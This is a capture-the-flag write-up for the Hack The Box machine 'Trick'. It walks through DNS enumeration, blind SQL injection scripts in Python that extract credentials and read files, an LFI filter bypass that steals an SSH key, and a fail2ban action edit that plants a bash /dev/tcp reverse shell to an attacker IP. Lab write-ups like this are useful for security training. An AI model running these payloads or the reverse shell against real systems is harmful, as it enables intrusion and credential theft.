---
Primary_category: "[[EASY]]"
title: "TRICK"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses:
---

###### PRIMARY CATEGORY → [[EASY]]

#### *Summary*

- ***Summary A***
- ***Summary B***
- ***Summary C***
- ***Summary D***
- ***Summary E***

![[ACADEMY-20241101164644590.webp|400]]

---

#### *Setup*

Directory creation with the Machine's Name

```bash
mkdir Trick && cd !$
```

Creation of a *Pentesting Folder Structure* to store all the information related to the target

```bash
mkdir {Scans,Data,Tools}
```

---

#### *Recon*

##### *OS Identification*

First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*

The standard values are →

- ***About 64 → Linux***
- ***About 128 → Windows***

```bash
ping -c1 10.129.227.180
```

> [!NOTE]- *Command Output*
>
> ```bash
> PING 10.129.227.180 (10.129.227.180) 56(84) bytes of data.
> 64 bytes from 10.129.227.180: icmp_seq=1 ttl=63 time=49.9 ms
> 
> --- 10.129.227.180 ping statistics ---
> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
> rtt min/avg/max/mdev = 49.907/49.907/49.907/0.000 ms
> ```
>

As mentioned, according to the TTL, It seems that It is a ***LINUX Target***

##### *Port Scanning*

###### *General Scan*

Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine

The Scan result is exported in a grepable format for subsequent *Port Parsing*

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG Trick.allPorts 10.129.227.180
```

> [!BUG]- *Trick.allPorts*
>
> ```bash
> # Nmap 7.94SVN scan initiated Fri Jan  2 15:25:47 2026 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG Trick.allPorts 10.129.227.180
> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
> Host: 10.129.227.180 ()	Status: Up
> Host: 10.129.227.180 ()	Ports: 22/open/tcp//ssh///, 25/open/tcp//smtp///, 53/open/tcp//domain///, 80/open/tcp//http///	Ignored State: closed (65531)
> # Nmap done at Fri Jan  2 15:25:59 2026 -- 1 IP address (1 host up) scanned in 12.56 seconds
> ```
>

**Open Ports →**

```bash
22, 25, 53 and 80
```

###### *Comprehensive Scan*

We can apply a little filter to the *Trick.allPorts* file to extract the ports and conduct a more comprehensive scan on them by extracting the services and their version running on each port and also executing some default scripts to gather more information

>  ***Note that this scan is also exported to have evidence at hand***

```bash
nmap -p$( grep -ioP --color -- '\s\d{1,5}(?=/)' Trick.allPorts | xargs | sed 's@\s@,@g' ) -sCV -v -n -Pn --disable-arp-ping -oN Trick.targeted 10.129.227.180
```

> [!BUG]- *Trick.targeted*
>
> ```bash
> # Nmap 7.94SVN scan initiated Fri Jan  2 15:27:04 2026 as: nmap -p22,25,53,80 -sCV -v -n -Pn --disable-arp-ping -oN Trick.targeted 10.129.227.180
> Nmap scan report for 10.129.227.180
> Host is up (0.052s latency).
> 
> PORT   STATE SERVICE VERSION
> 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
> | ssh-hostkey: 
> |   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
> |   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
> |_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
> 25/tcp open  smtp?
> |_smtp-commands: Couldn't establish connection on port 25
> 53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
> | dns-nsid: 
> |_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
> 80/tcp open  http    nginx 1.14.2
> |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
> |_http-title: Coming Soon - Start Bootstrap Theme
> | http-methods: 
> |_  Supported Methods: GET HEAD
> |_http-server-header: nginx/1.14.2
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
> 
> Read data files from: /usr/bin/../share/nmap
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> # Nmap done at Fri Jan  2 15:31:07 2026 -- 1 IP address (1 host up) scanned in 242.99 seconds
> ```
>

##### *53 - DNS*

Apart from the several web application running on port 80, this port is the only one for which we can carry out any type of enumeration

We cannot gather any relevant information from service listening on port 25 as it appears to be *postfix* and it is necessary to know a valid domain in order to perform any mail account enumeration

Similarly, we cannot carry out a *Domain Zone Transfer* either for the same reason. Therefore, let's start by crafting a *reverse DNS lookup* request for the target *IP Address*

```bash
dig -x 10.129.227.180 @10.129.227.180 +short
```

> [!NOTE]- *Command Output*
>
> ```bash
> trick.htb.
> ```
>

And we have a valid domain! Let's try to perform a *Zone Transfer* now

```bash
dig AXFR trick.htb @10.129.227.180 
```

> [!NOTE]- *Command Output*
>
> ```bash
> ; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> AXFR trick.htb @10.129.227.180
> ;; global options: +cmd
> trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
> trick.htb.		604800	IN	NS	trick.htb.
> trick.htb.		604800	IN	A	127.0.0.1
> trick.htb.		604800	IN	AAAA	::1
> preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
> trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
> ;; Query time: 50 msec
> ;; SERVER: 10.129.227.180#53(10.129.227.180) (TCP)
> ;; WHEN: Fri Jan 02 15:40:11 CET 2026
> ;; XFR size: 6 records (messages 1, bytes 231)
> ```
>

And now we have a valid subdomain!

We can add both the domain and subdomain to the */etc/hosts* just in case the *Web Service* is using *Virtual Hosting*

```bash
printf "%s\t%s\t%s" "10.129.227.180" "trick.htb" "preprod-payroll.trick.htb" >> /etc/hosts
```

> [!BUG]- */etc/hosts*
>
> ```bash
> # Host addresses
> 127.0.0.1  localhost
> 127.0.1.1  parrot
> ::1        localhost ip6-localhost ip6-loopback
> ff02::1    ip6-allnodes
> ff02::2    ip6-allrouters
> 
> # Custom Local Lab
> 192.168.1.133   4l3x-pc
> #192.168.1.100   dc01 DC01 dc01.lab.local lab.local
> 192.168.1.142   ws01  ws01.lab.local
> 
> # HTB Machines
> 10.129.227.180	trick.htb	preprod-payroll.trick.htb
> ```
>

##### *80 - HTTP*

We can list some of the *Web Technologies* running behind the web application as follows

```bash
whatweb 'http://trick.htb'
```

> [!NOTE]- *Command Output*
>
> ```bash
> http://trick.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.129.227.180], Script, Title[Coming Soon - Start Bootstrap Theme], nginx[1.14.2]
> ```
>

But there is nothing interesting apart from the fact that the *Web Server* is a *NGinx*

We get the following rendered content by visiting the website from the browser

![[TRICK-20260102161438790.webp|350]]

> ***Zoom in***

It appears to be an static *HTML* page. The form does not send the entered data anywhere either

We can confirm that the home page is an *index.html* by requesting the following *URL*

```bash
http://trick.htb/index.html
```

The same content is offered

Thus, before access the *web application* under *preprod-payroll.trick.htb*, let's perform some fuzzing by looking for any directories or *HTML* resources

```bash
ffuf -v -t 200 -w /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt -e '.html' -u 'http://trick.htb/FUZZ'
```

> [!NOTE]- *Command Output*
>
> ```bash
> 
> ```
>

But we got nothing interesting. So, let's continue with the other *virtual hosts*, if exists

![[TRICK-20260102162322017.webp|350]]

> ***Zoom in***

This time we face a login panel, which seems to work since the website is running *PHP*

Therefore, our data is being processed by the web application. Before proceed with any type of injection, we can try some default credentials such as *admin:admin*, *guest:guest*, *trick:trick*

###### *Arbitrary File Read via SQL Injection*

But we are unable to access the web panel

Let's try an authentication bypass such as

```bash
test' or 1=1 -- -
```

And we are in! We can begin to inspect the control panel looking for any flaw such as a *file upload*, *file inclusion* and so on, but we will not found anything

So, let's take a step back and dig into the *SQLi* we have found in the previous login panel

To do so, we will log out and start *burpsuite* in order to intercept the *HTTP* request, and send it to the *Repeater*. This way we can test the login with different payloads

Since we have bypassed the panel by simply adding a single quote and an *OR* statement, we can follow this pattern to craft more complex payloads and thus exhaustively enumerate the database server

![[TRICK-20260102173132602.webp|350]]

> ***Zoom in***

We can see that we receive a *"3"* on the *HTTP response body* when the login action fails due to invalid credentials

In the other hand, we receive a *"1"* with a successful login

![[TRICK-20260102173344537.webp|350]]

> ***Zoom in***

No errors or information displayed in the response, so we can deduce we are dealing with a *Blind SQL Injection*. At least is not *time-based* 😊, so let's get to work

To accomplish this enumeration task, we will rely on *Python Scripting*

First, let's create a function which lists all existing databases


> [!BUG]- *Payload*
>
> ```bash
> test' OR SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),1,1) = 'a' -- -
> ```

> [!DANGER]- *Function*
>
> ```python
> def makeSQLQuery(data: str) -> requests.Response:
> 
>     url = "http://preprod-payroll.trick.htb/ajax.php?action=login"
> 
>     data = { "username" : "test" , "password" : data }
> 
>     try:
>         return requests.post(url, data=data)
> 
>     except requests.RequestException as e:
> 
>         print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
>         sys.exit(1)
> 
> def getDatabases() -> None:
> 
>     dbs = ""
>     characters = string.digits + string.ascii_lowercase + ',_-'
> 
>     print()
>     p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>     p1.status(Fore.MAGENTA + "Extracting all databases..." + Style.RESET_ALL)
> 
>     print()
>     p2 = log.progress(Fore.CYAN + "Databases" + Style.RESET_ALL)
> 
>     for number in range(1,200):
> 
>         for char in characters:
> 
>             r = makeSQLQuery(f"test' OR SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),{number},1) = '{char}'-- -")
> 
>             p2.status(Fore.MAGENTA + dbs + char + Style.RESET_ALL)
> 
>             if "1" in r.text:
> 
>                 dbs += char
>                 break
> 
>     p2.success(Fore.GREEN + dbs + Style.RESET_ALL)
> ```
>

![[TRICK-20260102191949799.webp|250]]

> ***Zoom in***

We have two databases, the default *information_schema* and *payroll_db*

Let's continue by listing the tables of the given database

> [!BUG]- *Payload*
>
> ```bash
>test' OR SUBSTR((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'payroll_db'),1,1) > 'a' -- -
> ```
>

> [!DANGER]- *Function*
>
> ```python
> def getDBTables(db: str) -> None:
> 
>     tables = ""
> 
>     print()
>     p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>     p1.status(Fore.MAGENTA + f"Extracting tables from {db} database..." + Style.RESET_ALL)
> 
>     print()
>     p2 = log.progress(Fore.CYAN + "DB Tables" + Style.RESET_ALL)
> 
>     for number in range(1,200):
> 
>         for char in string.digits + string.ascii_lowercase + ',_-':
> 
>             r = makeSQLQuery(f"test' OR SUBSTR((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = '{db}'),{number},1) = '{char}' -- -")
> 
>             p2.status(Fore.MAGENTA + tables + char + Style.RESET_ALL)
> 
>             if "1" in r.text:
> 
>                 tables += char
>                 break
> 
>     p2.success(Fore.GREEN + tables + Style.RESET_ALL)
> 
> ```
>

![[TRICK-20260102194149951.webp|250]]

> ***Zoom in***

The *users* table results really interesting, let's enumerate all its columns to see if it contains any passwords or something similar

> [!BUG]- *Payload*
>
> ```bash
> test' OR SUBSTR((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'payroll_db'),1,1) > 'a' -- -
> ```
>

> [!DANGER]- *Function*
>
> ```python
> def getTableColumns(db: str, table: str) -> None:
> 
>     columns = ""
> 
>     print()
>     p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>     p1.status(Fore.MAGENTA + f"Extracting columns from {db}.{table} table..." + Style.RESET_ALL)
> 
>     print()
>     p2 = log.progress(Fore.CYAN + "Columns" + Style.RESET_ALL)
> 
>     for number in range(1,200):
> 
>         for char in string.digits + string.ascii_lowercase + ',_-':
> 
>             r = makeSQLQuery(f"test' OR SUBSTR((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = '{table}' AND table_schema = '{db}'),{number},1) = '{char}' -- -")
> 
>             p2.status(Fore.MAGENTA + columns + char + Style.RESET_ALL)
> 
>             if "1" in r.text:
> 
>                 columns += char
>                 break
> 
>     p2.success(Fore.GREEN + columns + Style.RESET_ALL)
> ```
>

![[TRICK-20260103201656021.webp|250]]

> ***Zoom in***

As usual, we have a *username* and *password* columns on a *users* table, so let's extract the stored data

> [!BUG]- *Payload*
>
> ```bash
> test' OR SUBSTR((SELECT GROUP_CONCAT(username, ':', password) FROM payroll_db.users),1,1) > 'a' -- - 
> ```
>

> [!DANGER]- *Function*
>
> ```python
> def getData(table: str) -> None:
> 
>     data = ""
>     columns = [ 'username', 'password' ]
> 
>     print()
>     p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>     p1.status(Fore.MAGENTA + f"Extracting data from {table} table..." + Style.RESET_ALL)
> 
>     print()
>     p2 = log.progress(Fore.CYAN + "Data" + Style.RESET_ALL)
> 
>     for number in range(1,200):
> 
>         for char in string.digits + string.ascii_lowercase + ':,_-':
> 
>             r = makeSQLQuery(f"test' OR SUBSTR((SELECT GROUP_CONCAT({columns[0]}, ':', {columns[1]}) FROM payroll_db.users),{number},1) = '{char}' -- -")
> 
>             p2.status(Fore.MAGENTA + data + char + Style.RESET_ALL)
> 
>             if "1" in r.text:
> 
>                 data += char
>                 break
> 
>     p2.success(Fore.GREEN + data + Style.RESET_ALL)
> ```
>

![[TRICK-20260103204000053.webp|250]]

> ***Zoom in***

And we have a username and a password! We could use these credentials to log in to the system via *SSH*

```bash
nxc ssh 10.129.227.180 --username 'enemigosss' --password 'superguccirainbowcake'
```

> [!NOTE]- *Command Output*
>
> ```bash
> SSH                      10.129.227.180  22     10.129.227.180   [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
> SSH                      10.129.227.180  22     10.129.227.180   [-] enemigosss:superguccirainbowcake
> ```
>

But they are not valid. It may be useful for *password reuse* latter

At this point, we should check the privileges of the current database user to see if we can read certain system files or write a file on a specific path

We can list them through the *SQL Injection* as follows

> [!BUG]- *Payload*
>
> ```bash
> test' OR SUBSTR((SELECT GROUP_CONCAT(grantee, ':', privilege_type) FROM information_schema.user_privileges),1,1) > ' ' -- -
> ```
>

> [!DANGER]- *Function*
>
> ```python
> def getPrivileges() -> None:
> 
>     data = ""
> 
>     print()
>     p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>     p1.status(Fore.MAGENTA + "Extracting DB Privileges..." + Style.RESET_ALL)
> 
>     print()
>     p2 = log.progress(Fore.CYAN + "Privileges" + Style.RESET_ALL)
> 
>     for number in range(1,200):
> 
>         for char in string.digits + string.ascii_lowercase + "@,-_: ":
> 
>             r = makeSQLQuery(f"test' OR SUBSTR((SELECT GROUP_CONCAT(grantee, ':', privilege_type) FROM information_schema.user_privileges),{number},1) = '{char}' -- -")
> 
>             p2.status(Fore.MAGENTA + data + char + Style.RESET_ALL)
> 
>             if "1" in r.text:
> 
>                 data += char
>                 break
> 
>     p2.success(Fore.GREEN + data + Style.RESET_ALL)
> ```
>

![[TRICK-20260104194658918.webp|250]]

> ***Zoom in***

We now know that the current user is called *remo* and has the *FILE* permission, which allows *READ* or *WRITE* (or both) files in the system

Therefore, we can check if the current user can read files such as the */etc/passwd* file

To do so, we can continue with python scripting and build a function that allows us to list the content of a provided file

> [!BUG]- *Payload*
>
> ```bash
> test' OR SUBSTR((SELECT HEX(LOAD_FILE("/etc/passwd"))),1,1) = '7' -- -
> ```
>

> [!DANGER]- *Function*
>
> ```python
> def getContentFile(file: str) -> None:
> 
>     content = ""
> 
>     print()
>     p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>     p1.status(Fore.MAGENTA + f"Extracting the content of {file}..." + Style.RESET_ALL)
> 
>     print()
>     p2 = log.progress(Fore.CYAN + "File Content" + Style.RESET_ALL)
> 
>     for number in range(1,10000):
> 
>         for char in string.digits + "abcdef":
> 
>             r = makeSQLQuery(f"test' OR SUBSTR((SELECT HEX(LOAD_FILE('{file}'))),{number},1) = '{char}' -- -")
> 
>             p2.status(Fore.MAGENTA + content + char + Style.RESET_ALL)
> 
>             if "1" in r.text:
> 
>                 content += char
>                 break
> 
>     p2.success(Fore.GREEN + bytes.fromhex(content).decode("UTF-8") + Style.RESET_ALL)
> ```
>

However, doing it this way is a bit tedious in terms of time and tools such as ***[SQLMap](https://github.com/sqlmapproject/sqlmap)*** can significantly speed the process

We can use this tool to read system files as follows →

```bash
python3 sqlmap.py -r test.req --batch --threads 10 --technique B --level 5 --file-read=/etc/hosts
```

> [!NOTE]- *Command Output*
>
> ```bash
>         ___
>        __H__
>  ___ ___[']_____ ___ ___  {1.10.1.3#dev}
> |_ -| . [(]     | .'| . |
> |___|_  ["]_|_|_|__,|  _|
>       |_|V...       |_|   https://sqlmap.org
> 
> [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
> 
> [*] starting @ 20:29:34 /2026-01-04/
> 
> [20:29:34] [INFO] parsing HTTP request from '../test.req'
> [20:29:34] [INFO] resuming back-end DBMS 'mysql' 
> [20:29:34] [INFO] testing connection to the target URL
> sqlmap resumed the following injection point(s) from stored session:
> ---
> Parameter: username (POST)
>     Type: boolean-based blind
>     Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
>     Payload: username=test' AND 1866=(SELECT (CASE WHEN (1866=1866) THEN 1866 ELSE (SELECT 2811 UNION SELECT 1084) END))-- aJBa&password=test
> ---
> [20:29:34] [INFO] the back-end DBMS is MySQL
> web application technology: Nginx 1.14.2
> back-end DBMS: MySQL 5 (MariaDB fork)
> [20:29:34] [INFO] fingerprinting the back-end DBMS operating system
> [20:29:34] [INFO] the back-end DBMS operating system is Linux
> [20:29:34] [INFO] fetching file: '/etc/passwd'
> [20:29:34] [INFO] retrieving the length of query output
> [20:29:34] [INFO] resumed: 4702
> [20:29:34] [INFO] resumed: 726F6F743A783A303A303A726F6F743A2F726F6F743A2F62696E2F...<SNIP>...
> do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
> [20:29:34] [INFO] retrieving the length of query output
> [20:29:34] [INFO] retrieved: 4
> [20:29:35] [INFO] retrieved: 2351           
> [20:29:35] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (2351 B)
> files saved to [1]:
> [*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)
> 
> [20:29:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
> 
> [*] ending @ 20:29:35 /2026-01-04/
> ```
>

We apply a simple filter to extract only the system user with a shell assigned

```bash
grep sh\$ /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
```

> [!BUG]- */etc/passwd*
>
> ```bash
> root:x:0:0:root:/root:/bin/bash
> michael:x:1001:1001::/home/michael:/bin/bash
> ```
>

And we have a user called *michael*. We could check if the password extracted earlier is valid for this user

```bash
nxc ssh 10.129.227.180 --username 'michael' --password 'superguccirainbowcake'
```

> [!NOTE]- *Command Output*
>
> ```bash
> SSH         10.129.227.180  22     10.129.227.180   [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
> SSH         10.129.227.180  22     10.129.227.180   [-] michael:superguccirainbowcake
> ```
>

But it is not. At this point, it would be interesting to list the content of some configuration files

We saw previously that the web server is a *Nginx*, thus we could look for any other *virtual hosts* in the configuration files located within the */etc/nginx/sites-available* directory

We can use *SQLMap* again for this task

```bash
python3 sqlmap.py -r test.req --batch --threads 10 --technique B --level 5 --file-read=/etc/nginx/sites-available/default
```

> [!NOTE]- *Command Output*
>
> ```bash
>         ___
>        __H__
>  ___ ___[(]_____ ___ ___  {1.10.1.3#dev}
> |_ -| . ["]     | .'| . |
> |___|_  [']_|_|_|__,|  _|
>       |_|V...       |_|   https://sqlmap.org
> 
> [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
> 
> [*] starting @ 21:35:02 /2026-01-04/
> 
> [21:35:02] [INFO] parsing HTTP request from '../test.req'
> [21:35:02] [INFO] resuming back-end DBMS 'mysql' 
> [21:35:02] [INFO] testing connection to the target URL
> sqlmap resumed the following injection point(s) from stored session:
> ---
> Parameter: username (POST)
>     Type: boolean-based blind
>     Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
>     Payload: username=test' AND 1866=(SELECT (CASE WHEN (1866=1866) THEN 1866 ELSE (SELECT 2811 UNION SELECT 1084) END))-- aJBa&password=test
> ---
> [21:35:02] [INFO] the back-end DBMS is MySQL
> web application technology: Nginx 1.14.2
> back-end DBMS: MySQL 5 (MariaDB fork)
> [21:35:02] [INFO] fingerprinting the back-end DBMS operating system
> [21:35:02] [INFO] the back-end DBMS operating system is Linux
> [21:35:02] [INFO] fetching file: '/etc/nginx/sites-available/default'
> [21:35:02] [INFO] retrieving the length of query output
> [21:35:02] [INFO] resumed: 2116
> [21:35:02] [INFO] resumed: 736572766572207B0A096C697374656E2...<SNIP>... 
> do you want confirmation that the remote file '/etc/nginx/sites-available/default' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
> [21:35:02] [INFO] retrieving the length of query output
> [21:35:02] [INFO] retrieved: 4
> [21:35:03] [INFO] retrieved: 1058           
> [21:35:03] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default' and the remote file '/etc/nginx/sites-available/default' have the same size (1058 B)
> files saved to [1]:
> [*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default (same file)
> 
> [21:35:03] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
> 
> [*] ending @ 21:35:03 /2026-01-04/
> ```
>

> [!BUG]- */etc/nginx/sites-availabe/default*
>
> ```bash
> server {
> 	listen 80;
> 	listen [::]:80;
> 
> 	server_name preprod-marketing.trick.htb;
> 
> 	root /var/www/market;
> 	index index.php;
> 
> 	location / {
> 		try_files $uri $uri/ =404;
> 	}
> 
>         location ~ \.php$ {
>                 include snippets/fastcgi-php.conf;
>                 fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
>         }
> }
> 
> server {
>         listen 80;
>         listen [::]:80;
> 
>         server_name preprod-payroll.trick.htb;
> 
>         root /var/www/payroll;
>         index index.php;
> 
>         location / {
>                 try_files $uri $uri/ =404;
>         }
> 
>         location ~ \.php$ {
>                 include snippets/fastcgi-php.conf;
>                 fastcgi_pass unix:/run/php/php7.3-fpm.sock;
>         }
> }
> ```
>

And we have another *subdomain* which is serving different content located on */var/www/market*

We can add this subdomain to the */etc/hosts* file and visit it from the browser to see what it offers to us

```bash
printf "\t%s" "preprod-marketing.trick.htb" >> /etc/hosts
```

> [!BUG]- */etc/hosts*
>
> ```bash
> # Host addresses
> 127.0.0.1  localhost
> 127.0.1.1  parrot
> ::1        localhost ip6-localhost ip6-loopback
> ff02::1    ip6-allnodes
> ff02::2    ip6-allrouters
> 
> # Custom Local Lab
> 192.168.1.133   4l3x-pc
> #192.168.1.100   dc01 DC01 dc01.lab.local lab.local
> 192.168.1.142   ws01  ws01.lab.local
> 
> # HTB Machines
> 10.129.227.180	trick.htb	preprod-payroll.trick.htb	preprod-marketing.trick.htb
> ```
>

###### *LFI*

And we have another simple website with no accesible *URLs*

![[TRICK-20260104214357074.webp|250]]

> ***Zoom in***

Every time we click on a section of the *"header"* shown in the image above, the value of a *URL* parameter called *"page"* changes

This *URL* presents the following structure

```bash
http://preprod-marketing.trick.htb/index.php?page=<PAGE>.<EXTENSION>
```

The first thing that comes to mind is to try a *Directory Path Traversal* to achieve a file inclusion by abusing the *page* parameter

Let's give it a try. We can start with the following payload

```bash
?page=../../../../../etc/passwd
```

![[TRICK-20260107175924182.webp|350]]

> ***Zoom in***

But we do not get any results

We can directly reference its absolute path without any *directory path traversal*

```bash
?page=/etc/passwd
```

![[TRICK-20260107180157398.webp|350]]

Nothing again...

We can try a slighly more sophisticated payload just in case the web application is removing the following character sequence → **`../`**

```bash
?page=....//....//....//....//etc/passwd
```

![[TRICK-20260107180719520.webp|350]]

> ***Zoom in***

Here we go! We have an *LFI* through the *page* parameter

> [!BUG]- */etc/passwd*
>
> ```bash
> root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
> ...<SNIP>...
> mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
> sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
> postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
> bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
> michael:x:1001:1001::/home/michael:/bin/bash
> ```
>

We can filter by user accounts that have a *shell* assigned

```bash
curl --silent --location --request GET "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd" | grep 'sh$'
```

> [!NOTE]- *Command Output*
>
> ```bash
> root:x:0:0:root:/root:/bin/bash
> michael:x:1001:1001::/home/michael:/bin/bash
> ```
>

And we have a user called *Michael*. It would be interesting to search for a private key in its *.ssh* directory

```bash
curl --silent --location --request GET "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
```

> [!BUG]- */home/michael/.ssh/id_rsa*
>
> ```bash
> -----BEGIN OPENSSH PRIVATE KEY-----
> b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdz...<SNIP>...
> -----END OPENSSH PRIVATE KEY-----
> ```
>

And we have one!

---

#### *Shell as Web User*

Let's connect remotely to the target via *SSH* as *Michael* using the private key above

```bash
ssh -p 22 -i michael.id_rsa michael@10.129.227.180
```

Then, we can carry out a minor treatment of the terminal

```bash
export TERM=xterm-256color
. /etc/skel/.bashrc
```

---

#### *Privesc #1*

***Initial Non-Privileged User → Michael***

##### *Sudo Privileges on Fail2ban*

First, let's check which groups the current user belongs to

```bash
id
```

> [!NOTE]- *Command Output*
>
> ```bash
> uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
> ```
>

And he is member of the *security* group, we should take this into account

Next, we can check if *Michael* has any *sudo* privilege

```bash
sudo -l
```

> [!NOTE]- *Command Output*
>
> ```bash
> Matching Defaults entries for michael on trick:
>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
> 
> User michael may run the following commands on trick:
>     (root) NOPASSWD: /etc/init.d/fail2ban restart
> ```
>

And we are able to restart the *fail2ban* service running on the target

Before searching for any *binary* with the *SUID* bit enabled, let's find out which directories the current user has write permissions for

```bash
find / \( -path /proc -o -path /sys -o -path /home -o -path /run -o -path /tmp -o -path /var/www \) -prune -o -writable -type d -ls 2> /dev/null
```

> [!NOTE]- *Command Output*
>
> ```bash
>     93856     84 drwx-wx-wt   2 root     root        86016 May 25  2022 /var/lib/php/sessions
>     46377      4 drwxrwxrwt   7 root     root         4096 Jan  7 18:39 /var/tmp
>    269281      4 drwxrwx---   2 root     security     4096 Jan  7 18:45 /etc/fail2ban/action.d
>     10828      0 drwxrwxrwt   2 root     root           40 Jan  7 17:40 /dev/mqueue
>     11546      0 drwxrwxrwt   2 root     root           40 Jan  7 17:41 /dev/shm
> ```
>

The *security* group owns the */etc/fail2ban/action.d* directory, which means that we can create any file within in

An *action* in *fail2ban* refers to *what to do* when an *IP Address* is marked as malicious according to some *filters*

Various actions can be carried out, such as adding a *firewall rule*, adding an *ipset*, running a certain script or command and so on

Since we are able to create or modify an *action* configuration file within the */etc/fail2ban/action.d* directory, we can modify one that is being used by the service, which can be consulted by filtering for the *banaction* directive in the */etc/fail2ban/jail.conf* file

```bash
grep -iP -- '^banaction = [^%].+$' ../jail.conf
```

> [!NOTE]- *Command Output*
>
> ```bash
> banaction = iptables-multiport
> banaction = iptables-multiport-log
> ```
>

So, we can modify the file related to the *iptables-multiport action* and add the command below

```bash
bash -i &> /dev/tcp/10.10.15.174/4444 0>&1
```

It sends a *reverse shell* to our attacker machine

Likewise, we should set a *TCP listener* on *port 4444*

```bash
nc -nlvp 4444
```

The file would look like this

> [!BUG]- */etc/fail2ban/action.d*
>
> ```bash
> [INCLUDES]
> before = iptables-common.conf
> [Definition]
> actionstart = <iptables> -N f2b-<name>
>               <iptables> -A f2b-<name> -j <returntype>
>               <iptables> -I <chain> -p <protocol> -j f2b-<name>
> actionstop = <iptables> -D <chain> -p <protocol> -j f2b-<name>
>              <actionflush>
>              <iptables> -X f2b-<name>
> actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'
> actionban = bash -c "bash -i &> /dev/tcp/10.10.15.174/4444 0>&1"
> actionunban = bash -c "bash -i &> /dev/tcp/10.10.15.174/4444 0>&1"
> [Init]
> ```
>

Once the given *action* file is modified, we must restart the *fail2ban* service in order to apply the changes made, which we can do thanks to the *sudo privilege*

```bash
sudo -u root -- /etc/init.d/fail2ban restart
```

> [!NOTE]- *Command Output*
>
> ```bash
